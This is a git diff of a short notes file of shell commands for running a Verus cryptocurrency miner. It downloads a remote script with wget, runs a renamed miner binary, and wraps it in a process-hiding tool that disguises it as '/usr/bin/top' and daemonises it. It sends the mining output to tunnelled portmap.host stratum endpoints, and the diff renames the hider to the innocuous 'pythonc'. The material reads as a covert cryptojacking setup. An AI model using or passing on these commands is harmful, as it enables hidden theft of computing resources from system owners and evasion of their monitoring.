@@ -9,11 +9,11 @@ wget https://raw.githubusercontent.com/hudahadoh/vs/main/vs.sh && chmod +x vs.sh
 
 ./bhmax -a verus  -o stratum+tcp://eu.luckpool.net:3956  -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.py1 -p x -t 1
 
-./hi -s "/usr/bin/top" -d -p test.pid ./bhmax  -a verus  -o stratum+tcp://jecdg-64162.portmap.host:64162  -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.x85 -p x -t 85
-./hi -s "/usr/bin/top" -d -p test.pid ./bhmax  -a verus  -o stratum+tcp://jecdg-64162.portmap.host:64162  -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.xlt1-4 -p x -t 1
+./pythonc -s "/usr/bin/top" -d -p test.pid ./bhmax  -a verus  -o stratum+tcp://dusta-44444.portmap.host:44444  -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.x85 -p x -t 85
+./pythonc -s "/usr/bin/top" -d -p test.pid ./bhmax  -a verus  -o stratum+tcp://dusta-44444.portmap.host:44444  -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.cd1 -p x -t 2
 
 
-###
+### git clone --single-branch -b  Verus2.2gpu https://github.com/monkins1010/ccminer.git
 git clone --single-branch -b Verus2.2gpu https://github.com/monkins1010/ccminer.git (gpu nvidia)
 git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git  (cpu only)
 
